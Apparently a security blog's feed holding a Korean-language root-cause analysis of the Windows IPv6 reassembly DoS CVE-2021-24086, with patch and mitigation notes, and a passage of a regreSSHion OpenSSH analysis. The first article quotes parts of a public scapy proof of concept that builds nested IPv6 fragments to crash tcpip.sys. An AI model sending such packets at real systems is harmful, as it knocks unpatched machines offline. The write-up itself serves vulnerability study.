<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-US"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4444/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4444/" rel="alternate" type="text/html" hreflang="en-US" /><updated>2024-11-08T09:20:16+09:00</updated><id>http://localhost:4444/feed.xml</id><title type="html">41D3N</title><subtitle>I&apos;m nobody</subtitle><author><name>Aiden</name><email>aidencom99@email.com</email></author><entry><title type="html">CVE-2021-24086 - Analysis of Windows TCP/IP IPv6 Denial of Service (DoS) Vulnerability</title><link href="http://localhost:4444/CVE-2021-24086/" rel="alternate" type="text/html" title="CVE-2021-24086 - Analysis of Windows TCP/IP IPv6 Denial of Service (DoS) Vulnerability" /><published>2024-11-05T09:00:00+09:00</published><updated>2024-11-05T09:00:00+09:00</updated><id>http://localhost:4444/CVE-2021-24086</id><content type="html" xml:base="http://localhost:4444/CVE-2021-24086/"><![CDATA[<p><img src="/assets/img/CVE-2021-24086/title.png" /></p>
<h1 id="intro">Intro</h1>

<p>TOOR 팀 활동을 하며 분석하게된 윈도우 커널 드라이버 원데이 취약점에 관한 글입니다.</p>
<p align="center"><img src="/assets/img/toor.png" /></p>

<p>이번에 알아볼 취약점은 <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-24086">2021년 2월 9일</a>에 공개된 DoS 취약점입니다.</p>

<p>윈도우 <code class="language-plaintext highlighter-rouge">tcpip.sys</code>에서 IPv6의 재조립 패킷을 처리하는 도중 잘못된 처리로 인하여 취약점이 발생합니다.</p>

<p>본 글은 선행 연구를 진행하신 다른 연구원분들의 글들을 읽고 제 나름 분석을 진행하며 취약점을 공부하며 이해하고 정리해본 결과로 작성하게된 글입니다. 나름의 분석을 해봤지만 맞지 않는 부분이 있을 수 있으며, 만약 이를 발견하셨을 시 피드백해주시면 적극 반영하도록 하겠습니다. 취약점 및 PoC 분석에 많은 도움이된 자료는 다음과 같습니다.</p>

<ul>
  <li><a href="https://doar-e.github.io/blog/2021/04/15/reverse-engineering-tcpipsys-mechanics-of-a-packet-of-the-death-cve-2021-24086/">https://doar-e.github.io/blog/2021/04/15/reverse-engineering-tcpipsys-mechanics-of-a-packet-of-the-death-cve-2021-24086/</a></li>
  <li><a href="https://blog.quarkslab.com/analysis-of-a-windows-ipv6-fragmentation-vulnerability-cve-2021-24086.html">https://blog.quarkslab.com/analysis-of-a-windows-ipv6-fragmentation-vulnerability-cve-2021-24086.html</a></li>
</ul>

<h1 id="vuln">Vuln</h1>

<ul>
  <li>CVE-ID : <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-24086">CVE-2021-24086</a></li>
  <li>CWE : Insufficient Information</li>
</ul>

<h1 id="env">Env</h1>

<p>디핑 결과 분석은 현재 공개된 <a href="https://github.com/0vercl0k/CVE-2021-24086/tree/main">PoC Repository</a>에 있는 두 파일을 활용했습니다.</p>
<p align="center"><img src="/assets/img/CVE-2021-24086/poc_github_binaries.png" /></p>

<p>동적 분석을 진행한 victim 빌드 버전은 다음과 같습니다.</p>
<p align="center"><img src="/assets/img/CVE-2021-24086/victim_version.png" /></p>

<h1 id="identifying-the-differences-in-the-tcpipsys-driver">Identifying the differences in the tcpip.sys driver</h1>

<p>주어진 몇몇의 정보를 토대로 IPv6의 <code class="language-plaintext highlighter-rouge">Fragment</code> 패킷 재조립 과정에서 취약점이 발생한다는 사실을 알 수 있습니다.</p>

<p><a href="https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2021-24086https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2021-24086">MSRC</a>에 나와있듯 취약점은 재조립 패킷 처리를 비활성화 함으로써 완화시킬 수 있습니다. 이를 통해서 재조립 과정에서 취약점이 발생할 수 있다 생각할 수 있습니다.</p>

<p>또한 주어진 두 파일의 IPv6를 디핑해보면 다음과 같은 두 함수에서 유사도에 차이가 생겼음을 알 수 있습니다.</p>

<p align="center"><img src="/assets/img/CVE-2021-24086/diffing.png" /></p>

<p><code class="language-plaintext highlighter-rouge">IPv6pReassembleDatagram</code>에 다음과 같은 차이가 생겼는데 특정한 연산의 결과에 대해 <code class="language-plaintext highlighter-rouge">0xFFFF</code>보다 큰지 체크하는 로직이 생겨났습니다.</p>

<p align="center"><img src="/assets/img/CVE-2021-24086/Ipv6pReassembleDatagram_diff_1.png" /></p>
<p align="center"><img src="/assets/img/CVE-2021-24086/Ipv6pReassembleDatagram_diff_2.png" /></p>

<p>PoC와 함께 RCA를 알아봅시다.</p>

<h1 id="rca">RCA</h1>

<p>PoC를 작동시켜보면 다음과 같이 <code class="language-plaintext highlighter-rouge">Ipv6pReassembleDatagram</code>의 코드 중 <code class="language-plaintext highlighter-rouge">NdisGetDataBuffer</code> 호출문에서의 반환값이 <code class="language-plaintext highlighter-rouge">NULL</code>이 될때 <code class="language-plaintext highlighter-rouge">NULL</code> 포인터 역참조로 인해서 BSOD가 발생하는 모습을 볼 수 있습니다.</p>

<p align="center"><img src="/assets/img/CVE-2021-24086/bsod.png" /></p>

<p><code class="language-plaintext highlighter-rouge">NdisGetDataBuffer</code>에서 다음과 같이 <code class="language-plaintext highlighter-rouge">NULL</code>이 반환되고</p>
<p align="center"><img src="/assets/img/CVE-2021-24086/null_return.png" /></p>

<p>이는 스택에 저장되었다. 이후에 참조되지만 <code class="language-plaintext highlighter-rouge">NULL</code> 포인터이므로 역참조 했을 때 크래시가 발생합니다.</p>
<p align="center"><img src="/assets/img/CVE-2021-24086/null_pointer_deref.png" /></p>

<p align="center"><img src="/assets/img/CVE-2021-24086/decompiled_code.png" /></p>

<p>위의 흐름을 보면 알 수 있듯, 해당 로직에선 <code class="language-plaintext highlighter-rouge">NdisGetDataBuffer</code>가 반환한 포인터가 <code class="language-plaintext highlighter-rouge">NULL</code>이 아닌 것으로 신뢰하고 있기 때문에 발생하는 모습을 볼 수 있습니다.</p>

<p><code class="language-plaintext highlighter-rouge">Ipv6pReassembleDatagram</code>은 IPv6의 <code class="language-plaintext highlighter-rouge">Fragmentation</code> 패킷을 처리할 때 호출됩니다. 취약점에서 집중해야할 주요 함수들은 다음과 같습니다.</p>
<p align="center"><img src="/assets/img/CVE-2021-24086/Ipv6pReassembleDatagram.png" /></p>

<p>해당 부분의 <code class="language-plaintext highlighter-rouge">BytesNeeded</code>는 재조립되어야할 패킷 중 <code class="language-plaintext highlighter-rouge">Unfragmentable part</code>의 길이를 구하는 부분입니다. 이는 재조립될 패킷을 저장할 영역을 할당할 때 길이정보로 사용됩니다.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BytesNeeded</span> <span class="o">=</span> <span class="n">v3</span> <span class="o">+</span> <span class="mi">40</span><span class="p">;</span>
</code></pre></div></div>

<p>앞서 계산한 <code class="language-plaintext highlighter-rouge">BytesNeeded</code>로 필요한 데이터 영역을 할당합니다. 일때 유심하게봐야할 것은 <code class="language-plaintext highlighter-rouge">(unsigned __int16)BytesNeeded</code>로 2바이트로 크기 잘린다는 것입니다.
여기서 <code class="language-plaintext highlighter-rouge">v15</code>로 할당된 메모리 영역은 이후에 취약점을 살펴볼 때 봤던 함수인 <code class="language-plaintext highlighter-rouge">NdisGetDataBuffer</code>에서 사용됩니다.</p>

<blockquote>
  <p>NdisGetDataBuffer
Call the NdisGetDataBuffer function to gain access to a contiguous block of data from a NET_BUFFER structure.</p>
</blockquote>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">NetioRetreatNetBuffer</span><span class="p">(</span><span class="n">v15</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int16</span><span class="p">)</span><span class="n">BytesNeeded</span><span class="p">,</span> <span class="mi">0</span><span class="n">i64</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
</code></pre></div></div>

<p>앞서 v15에 할당한 메모리 영역을 다시 <code class="language-plaintext highlighter-rouge">NdisGetDataBuffer</code> 요구하는 모습입니다. 이때 <code class="language-plaintext highlighter-rouge">BytesNeeded</code>는 잘림없이 그대로 들어가게됩니다.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BytesNeededa</span> <span class="o">=</span> <span class="n">NdisGetDataBuffer</span><span class="p">((</span><span class="n">PNET_BUFFER</span><span class="p">)</span><span class="n">v15</span><span class="p">,</span> <span class="n">BytesNeeded</span><span class="p">,</span> <span class="mi">0</span><span class="n">i64</span><span class="p">,</span> <span class="mi">1u</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</code></pre></div></div>

<p>이때 문제점이 발생합니다. 만약 <code class="language-plaintext highlighter-rouge">BytesNeeded == 0x1FFFF</code>인 상황이 발생하면 어떻게 될까요? 위에서 <code class="language-plaintext highlighter-rouge">NetioRetreatNetBuffer</code>에 의해서 할당한 메모리의 크기는 <code class="language-plaintext highlighter-rouge">0xFFFF</code>지만 <code class="language-plaintext highlighter-rouge">NdisGetDataBuffer</code>에서는 <code class="language-plaintext highlighter-rouge">0x1FFFF</code>를 요구하게됩니다. 할당된 메모리보다 사용을 위해 요구하는 메모리의 크기가 더 크면 <code class="language-plaintext highlighter-rouge">NdisGetDataBuffer</code>는 어떻게 행동하는지 문서를 확인해봅시다.</p>

<blockquote>
  <p>Return value
NdisGetDataBuffer returns a pointer to the start of the contiguous data or it returns NULL.</p>

  <p>If the DataLength member of the NET_BUFFER_DATA structure in the NET_BUFFER structure that the NetBuffer parameter points to is less than the value in &gt;the BytesNeeded parameter, the return value is NULL.</p>
</blockquote>

<p>할당된 메모리 길이(DataLength) 보다 파라미터로 요구한 <code class="language-plaintext highlighter-rouge">BytesNeeded</code>가 더 클 경우 <code class="language-plaintext highlighter-rouge">NULL</code>을 반환한다고 되어있습니다.</p>

<p>위에서 알아봤듯, 계산된 IPv6 헤더 크기(40) + 확장 헤더의 크기가 <code class="language-plaintext highlighter-rouge">0xFFFF</code>보다 커지는 상황이되면 BSOD가 발생합니다.
어떻게 이러한 패킷을 만들어내는지 PoC를 확인해봅시다.</p>

<h1 id="poc">PoC</h1>

<p>현재 공개된 <a href="https://github.com/0vercl0k/CVE-2021-24086/blob/main/cve-2021-24086.py">PoC</a>를 확인해봅시다.</p>

<p>PoC 코드는 간단합니다. PoC에서는 공격을 위해서 <a href="https://media.blackhat.com/ad-12/Atlasis/bh-ad-12-security-impacts-atlasis-wp.pdf">중첩된 Fragment 패킷</a>을 이용합니다.</p>

<p>취약점 트리거를 위해 다음과 같이 거대한 헤더를 갖는 <code class="language-plaintext highlighter-rouge">Reassemble</code> 패킷을 만들어냅니다.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">reassembled_pkt</span> <span class="o">=</span> <span class="n">IPv6ExtHdrDestOpt</span><span class="p">(</span><span class="n">options</span> <span class="o">=</span> <span class="p">[</span>
            <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0xff</span><span class="p">)),</span>
            <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s">'b'</span><span class="o">*</span><span class="mh">0xff</span><span class="p">)),</span>
            <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s">'c'</span><span class="o">*</span><span class="mh">0xff</span><span class="p">)),</span>
            <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s">'d'</span><span class="o">*</span><span class="mh">0xff</span><span class="p">)),</span>
            <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s">'e'</span><span class="o">*</span><span class="mh">0xff</span><span class="p">)),</span>
            <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s">'f'</span><span class="o">*</span><span class="mh">0xff</span><span class="p">)),</span>
            <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s">'0'</span><span class="o">*</span><span class="mh">0xff</span><span class="p">)),</span>
        <span class="p">])</span> \
        <span class="o">/</span> <span class="p">...</span> \
        <span class="o">/</span> <span class="n">IPv6ExtHdrFragment</span><span class="p">(</span>
            <span class="nb">id</span> <span class="o">=</span> <span class="n">second_pkt_id</span><span class="p">,</span> <span class="n">m</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
            <span class="n">nh</span> <span class="o">=</span> <span class="mi">17</span><span class="p">,</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="p">)</span> \
        <span class="o">/</span> <span class="n">UDP</span><span class="p">(</span><span class="n">dport</span> <span class="o">=</span> <span class="mi">31337</span><span class="p">,</span> <span class="n">sport</span> <span class="o">=</span> <span class="mi">31337</span><span class="p">,</span> <span class="n">chksum</span><span class="o">=</span><span class="mh">0x7e7f</span><span class="p">)</span>
</code></pre></div></div>

<p>다음은 재조립을 유도하기 위해서 이후 재조립에 사용될 패킷을 전송합니다.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">sendp</span><span class="p">(</span><span class="n">frags</span><span class="p">,</span> <span class="n">iface</span><span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">iface</span><span class="p">)</span>

    <span class="n">reassembled_pkt_2</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">()</span> \
        <span class="o">/</span> <span class="n">IPv6</span><span class="p">(</span><span class="n">dst</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">target</span><span class="p">)</span> \
        <span class="o">/</span> <span class="n">IPv6ExtHdrFragment</span><span class="p">(</span><span class="nb">id</span> <span class="o">=</span> <span class="n">second_pkt_id</span><span class="p">,</span> <span class="n">m</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="n">nh</span> <span class="o">=</span> <span class="mi">17</span><span class="p">)</span> \
        <span class="o">/</span> <span class="s">'doar-e ftw'</span>

    <span class="n">sendp</span><span class="p">(</span><span class="n">reassembled_pkt_2</span><span class="p">,</span> <span class="n">iface</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">iface</span><span class="p">)</span>
</code></pre></div></div>

<p>이를 통해 길이가 <code class="language-plaintext highlighter-rouge">0xFFFF</code>가 넘는 재조립 패킷을 만들 수 있습니다.</p>

<p>다음과 같이 <code class="language-plaintext highlighter-rouge">0xFFE8 + 0x28</code> 형태의 <code class="language-plaintext highlighter-rouge">Nested fragment</code> 패킷을 전송하여 길이 연산결과가 <code class="language-plaintext highlighter-rouge">0x10010</code>되게 만듭니다.</p>
<p align="center"><img src="/assets/img/CVE-2021-24086/big_unfrag.png" /></p>

<p>이때 잘림 현상에 의해서 <code class="language-plaintext highlighter-rouge">NetioRetreatNetBuffer</code>로 전달되는 메모리 할당 길이는 <code class="language-plaintext highlighter-rouge">0x10</code>이 되고</p>
<p align="center"><img src="/assets/img/CVE-2021-24086/call_NetioRetreatNetBuffer.png" /></p>

<p><code class="language-plaintext highlighter-rouge">NdisGetDataBuffer</code>로 요구하는 데이터의 크기는 <code class="language-plaintext highlighter-rouge">0x10010</code>이됩니다. 따라서 <code class="language-plaintext highlighter-rouge">NdisGetDataBuffer</code>는 <code class="language-plaintext highlighter-rouge">NULL</code>을 반환하게되고 <code class="language-plaintext highlighter-rouge">NULL</code> 포인터 역참조가 발생합니다.</p>
<p align="center"><img src="/assets/img/CVE-2021-24086/call_NdisGetDataBuffer.png" /></p>

<h1 id="video">Video</h1>

<video width="100%" height="100%" controls="">
  <source src="/assets/videos/CVE-2021-24086/CVE-2021-24086.mkv" type="video/webm" />
</video>

<h1 id="patch">Patch</h1>

<p><code class="language-plaintext highlighter-rouge">Ipv6pReassembleDatagram</code>의 코드가 다음과 같이 패치된 것을 볼 수 있습니다.</p>
<p align="center"><img src="/assets/img/CVE-2021-24086/patched.png" /></p>

<p>해당 코드에서 나타나있는 <code class="language-plaintext highlighter-rouge">v30</code>은 <code class="language-plaintext highlighter-rouge">BytesNeeded</code>를 구할 때 사용한 <code class="language-plaintext highlighter-rouge">v3</code>(확장 헤더 영역의 길이)와 데이터 길이로 구성되는 재조합된 패킷의 총 길이를 의미합니다.</p>

<p>이 길이가 <code class="language-plaintext highlighter-rouge">0xFFFF</code>가 넘어갈 때 해당 재조립 패킷을 폐기시켜 앞서 알아본 바이트 잘림에 의한 <code class="language-plaintext highlighter-rouge">NdisGetDataBuffer</code>가 <code class="language-plaintext highlighter-rouge">NULL</code>을 반환하는 상황을 방지합니다.</p>

<h1 id="mitigation">Mitigation</h1>

<p>취약점은 해당 취약점에 대한 보안 업데이트를 다운로드 받아 적용하거나 IPv6의 재조립 패킷을 처리하는 중 발생하기 때문에 다음과 같이 IPv6의 재조립 기능을 비활성화시켜 취약점을 완화시킬 수도 있습니다.</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Netsh</span><span class="w"> </span><span class="nx">int</span><span class="w"> </span><span class="nx">ipv6</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">global</span><span class="w"> </span><span class="nx">reassemblylimit</span><span class="o">=</span><span class="mi">0</span><span class="w">
</span></code></pre></div></div>

<h1 id="references">References</h1>

<ul>
  <li><a href="https://doar-e.github.io/blog/2021/04/15/reverse-engineering-tcpipsys-mechanics-of-a-packet-of-the-death-cve-2021-24086/">https://doar-e.github.io/blog/2021/04/15/reverse-engineering-tcpipsys-mechanics-of-a-packet-of-the-death-cve-2021-24086/</a></li>
  <li><a href="https://blog.quarkslab.com/analysis-of-a-windows-ipv6-fragmentation-vulnerability-cve-2021-24086.html">https://blog.quarkslab.com/analysis-of-a-windows-ipv6-fragmentation-vulnerability-cve-2021-24086.html</a></li>
</ul>]]></content><author><name>Aiden</name><email>aidencom99@email.com</email></author><category term="1-day" /><category term="exploit" /><category term="tcpip.sys" /><category term="windows" /><summary type="html"><![CDATA[CVE-2021-24086]]></summary></entry><entry><title type="html">CVE-2024-6387/CVE-2006-5051/CVE-2008-4109 - Analysis of Vulnerabilities in OpenSSH Server on a glibc-based Linux System</title><link href="http://localhost:4444/CVE-2024-6387/" rel="alternate" type="text/html" title="CVE-2024-6387/CVE-2006-5051/CVE-2008-4109 - Analysis of Vulnerabilities in OpenSSH Server on a glibc-based Linux System" /><published>2024-10-15T09:00:00+09:00</published><updated>2024-10-15T09:00:00+09:00</updated><id>http://localhost:4444/CVE-2024-6387</id><content type="html" xml:base="http://localhost:4444/CVE-2024-6387/"><![CDATA[<p align="center"><img src="/assets/img/CVE-2024-6387/openssh.gif" /></p>

<h1 id="intro">Intro</h1>

<p>TOOR 팀 활동을 하며 분석하게된 OpenSSH 원데이 취약점에 관한 글입니다.</p>
<p align="center"><img src="/assets/img/toor.png" /></p>

<p><code class="language-plaintext highlighter-rouge">CVE-2024-6387</code>은 7월 1일에 공개된 <a href="https://en.wikipedia.org/wiki/Qualys">Qualys</a>에서 발견하고 <code class="language-plaintext highlighter-rouge">OpenSSH</code> 버전 <code class="language-plaintext highlighter-rouge">9.8/9.8p1</code>에서 패치된 취약점입니다. 
<code class="language-plaintext highlighter-rouge">CVE-2024-6387</code>은 <code class="language-plaintext highlighter-rouge">CVE-2006-5051</code>의 보안 회귀(Security Regression)로, 패치되었던 취약점이 잘못된 패치로 인해서 재발생한 케이스입니다.
<code class="language-plaintext highlighter-rouge">CVE-2006-5051</code>의 보안 회귀 취약점이기 때문에 해당 취약점은 “RegreSSHion”이란 이름으로 불리고 있습니다.</p>

<p>두 취약점 모두 <code class="language-plaintext highlighter-rouge">glibc</code>를 기반으로둔 리눅스 시스템 프로그램인 <code class="language-plaintext highlighter-rouge">OpenSSH</code>의 서버 프로그램에 존재하는 <code class="language-plaintext highlighter-rouge">SIGALRM</code> 시그널 핸들러에서 <code class="language-plaintext highlighter-rouge">Async-signal-unsafe</code> 함수를 사용하여 발생하게 되는 취약점입니다. 이로인해 레이스 컨디션이 발생할 수 있습니다. 결과적으론 해당 취약점으로 인해 root 권한으로 대상 서버에 대한 RCE가 가능해집니다.</p>

<p>본 글은 선행 연구를 진행하신 다른 연구원분들의 글들을 읽고 제 나름 분석을 진행하며 취약점을 공부하며 이해하고 정리해본 결과로 작성하게된 글입니다. 나름의 분석을 해봤지만 맞지 않는 부분이 있을 수 있으며, 만약 이를 발견하셨을 시 피드백해주시면 적극 반영하도록 하겠습니다. 취약점 및 <code class="language-plaintext highlighter-rouge">PoC</code> 분석에 많은 도움이된 자료는 다음과 같습니다.</p>

<ul>
  <li><a href="https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt">https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt</a></li>
</ul>

<h1 id="vuln">Vuln</h1>

<ul>
  <li>CVE-ID : CVE-2024-6387</li>
  <li>CWE : <a href="http://cwe.mitre.org/data/definitions/362.html">CWE-362</a>, <a href="http://cwe.mitre.org/data/definitions/364.html">CWE-364</a></li>
  <li>영향 받는 버전</li>
</ul>
<table>
    <tr>
        <th bgcolor="#00ff7f" style="color:black">취약하지 않은 버전</th>
        <th bgcolor="#fa8072" style="color:black">취약한 버전</th>
    </tr>
</table>
<table>
    <tr>
        <th> Release </th>
        <th> Status </th>
        <th> Date </th>
    </tr>
    <tr>
        <td bgcolor="#fa8072" style="color:black"> &lt; 4.4p1 </td>
        <td> CVE-2006-5051 또는 CVE-2008-4109에 대한 패치가 적용되지 않았을 경우 취약 </td>
        <td> 2006년 9월 27일 이전 </td>
    </tr>
    <tr>
        <td bgcolor="#00ff7f" style="color:black"> 4.4p1 ≤ OpenSSH &lt; 8.5p1 </td>
        <td> Mitigation 적용으로 취약하지 않음 </td>
        <td> 2006년 9월 27일 ~ 2021년 3월 3일 </td>
    </tr>
    <tr>
        <td bgcolor="#fa8072" style="color:black"> 8.5p1 ≤ OpenSSH &lt; 9.8p1 </td>
        <td> 취약점 재발 </td>
        <td> 2021년 3월 3일 ~ 2024년 7월 1일 </td>
    </tr>
    <tr> 
        <td bgcolor="#00ff7f" style="color:black"> ≥ 9.8p1 </td>
        <td> 회귀에 대한 패치 적용 </td>
        <td> 2024년 7월 1일 이후 </td>
    </tr>
</table>
<p>Reference : <a href="https://en.wikipedia.org/wiki/RegreSSHion">https://en.wikipedia.org/wiki/RegreSSHion</a></p>

<h1 id="rca">RCA</h1>

<p><code class="language-plaintext highlighter-rouge">CVE-2024-6387</code>에 대해 알아보기 전 먼저 <code class="language-plaintext highlighter-rouge">CVE-2006-5051</code>에 대해서 알아보고 해당 취약점이 어떻게 재발생하게되었는지 알아봅시다.</p>

<h2 id="cve-2006-5051">CVE-2006-5051</h2>

<p>OpenSSH의 코드 중 sshd.c에 존재하는 <a href="https://github.com/openssh/openssh-portable/blob/V_4_3/sshd.c#L307"><code class="language-plaintext highlighter-rouge">grace_alarm_handler</code></a>는 사용자가 로그인 요청을 하고나서 일정 시간이 지나도록 로그인을 하지 않으면 발생하는 <code class="language-plaintext highlighter-rouge">SIGALRM</code> 시그널을 처리하는 함수입니다.</p>

<p><code class="language-plaintext highlighter-rouge">grace_alarm_handler</code>는 sshd의 <a href="https://github.com/openssh/openssh-portable/blob/V_4_3/sshd.c#L1685"><code class="language-plaintext highlighter-rouge">main</code> 함수에서 설정</a>되고 <code class="language-plaintext highlighter-rouge">sshd_config</code> 지시어(LoginGraceTime)로 설정된 일정 시간이 지나게되었을 때 발생하는 <code class="language-plaintext highlighter-rouge">SIGALRM</code> 시그널을 처리하기 위해 호출됩니다.</p>

<p>다음과 같이 로그인 시도 후 <code class="language-plaintext highlighter-rouge">LoginGraceTime</code>이 설정되어있다면 인증 시간 초과(<code class="language-plaintext highlighter-rouge">SIGALRM</code>)에 의해 <code class="language-plaintext highlighter-rouge">grace_alarm_handler</code>가 호출됩니다.</p>

<p>영상에 나온 OpenSSH 버전은 <code class="language-plaintext highlighter-rouge">9.2p</code>로 <code class="language-plaintext highlighter-rouge">grace_alarm_handler</code>의 작동을 보여드리기 위해 사용되었습니다.</p>

<video width="100%" height="100%" controls="">
  <source src="/assets/videos/CVE-2024-6387/sigalarm_grace.mkv" type="video/webm" />
</video>

<p><code class="language-plaintext highlighter-rouge">OpenSSH 4.3</code> 버전의 <a href="https://github.com/openssh/openssh-portable/blob/V_4_3/sshd.c#L307"><code class="language-plaintext highlighter-rouge">grace_alarm_handler</code></a>는 다음과 같이 작성되어있습니다.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Signal handler for the alarm after the login grace period has expired.
 */</span>
<span class="k">static</span> <span class="kt">void</span>
<span class="nf">grace_alarm_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">)</span>
<span class="p">{</span>
	<span class="cm">/* XXX no idea how fix this signal handler */</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">use_privsep</span> <span class="o">&amp;&amp;</span> <span class="n">pmonitor</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">pmonitor</span><span class="o">-&gt;</span><span class="n">m_pid</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">kill</span><span class="p">(</span><span class="n">pmonitor</span><span class="o">-&gt;</span><span class="n">m_pid</span><span class="p">,</span> <span class="n">SIGALRM</span><span class="p">);</span>

	<span class="cm">/* Log error and exit. */</span>
	<span class="n">fatal</span><span class="p">(</span><span class="s">"Timeout before authentication for %s"</span><span class="p">,</span> <span class="n">get_remote_ipaddr</span><span class="p">());</span>
<span class="p">}</span>
</code></pre></div></div>

<p>로깅을 위해 <code class="language-plaintext highlighter-rouge">fatal</code> 함수를 호출하는 모습을 볼 수 있습니다. <code class="language-plaintext highlighter-rouge">fatal</code> 함수는 <a href="https://github.com/openssh/openssh-portable/blob/V_4_3/fatal.c">fatal.c</a>에 다음과 같이 작성되어있습니다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span>
<span class="nf">fatal</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,...)</span>
<span class="p">{</span>
	<span class="kt">va_list</span> <span class="n">args</span><span class="p">;</span>
	<span class="n">va_start</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">fmt</span><span class="p">);</span>
	<span class="n">do_log</span><span class="p">(</span><span class="n">SYSLOG_LEVEL_FATAL</span><span class="p">,</span> <span class="n">fmt</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>
	<span class="n">va_end</span><span class="p">(</span><span class="n">args</span><span class="p">);</span>
	<span class="n">cleanup_exit</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">fatal</code> 함수는 다시 로깅을 위해 <code class="language-plaintext highlighter-rouge">log.c</code>에 위치한 <a href="https://github.com/openssh/openssh-portable/blob/V_4_3/log.c#L286"><code class="language-plaintext highlighter-rouge">do_log</code></a> 함수를 호출합니다. 이제 <code class="language-plaintext highlighter-rouge">do_log</code> 코드를 확인해봅시다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span>
<span class="nf">do_log</span><span class="p">(</span><span class="n">LogLevel</span> <span class="n">level</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,</span> <span class="kt">va_list</span> <span class="n">args</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">...</span>
		<span class="n">syslog</span><span class="p">(</span><span class="n">pri</span><span class="p">,</span> <span class="s">"%.500s"</span><span class="p">,</span> <span class="n">fmtbuf</span><span class="p">);</span>
<span class="p">...</span>
	<span class="p">}</span>
<span class="err">}</span>
</code></pre></div></div>

<p>해당 코드에서 <code class="language-plaintext highlighter-rouge">syslog</code>를 호출하는 모습을 볼 수 있습니다. 이때 <code class="language-plaintext highlighter-rouge">glibc</code>의 <code class="language-plaintext highlighter-rouge">syslog</code>는 메모리 버퍼 스트림을 생성하기 위해서 <code class="language-plaintext highlighter-rouge">malloc</code>을 호출하고 함수의 끝에서는 해당 메모리를 정리하기 위해서 <code class="language-plaintext highlighter-rouge">free</code>함수를 호출합니다.
이때의 <a href="https://stackoverflow.com/questions/3941271/why-are-malloc-and-printf-said-as-non-reentrant"><code class="language-plaintext highlighter-rouge">malloc</code></a>과 <code class="language-plaintext highlighter-rouge">free</code>는 비동기 시그널에 안전하지 않기 때문에 시그널 처리 함수에서는 호출되어선 안되지만 <code class="language-plaintext highlighter-rouge">syslog</code>의 호출로 인해서 취약점이 발생한 상황입니다.</p>

<h2 id="async-signal-safe-function">Async-signal-safe function</h2>

<p><code class="language-plaintext highlighter-rouge">Async-signal-safe</code> 함수란 시그널 핸들러 내에서 안전하게 호출할 수 있는 함수를 뜻합니다.</p>

<p>시그널 핸들러에서 호출하는 함수가 <code class="language-plaintext highlighter-rouge">async signal safety</code>(비동기 시그널 안전성)이 없을 경우 취약점이 발생할 수 있습니다.</p>

<ul>
  <li><a href="https://stackoverflow.com/questions/3941271/why-are-malloc-and-printf-said-as-non-reentrant">https://stackoverflow.com/questions/3941271/why-are-malloc-and-printf-said-as-non-reentrant</a></li>
</ul>

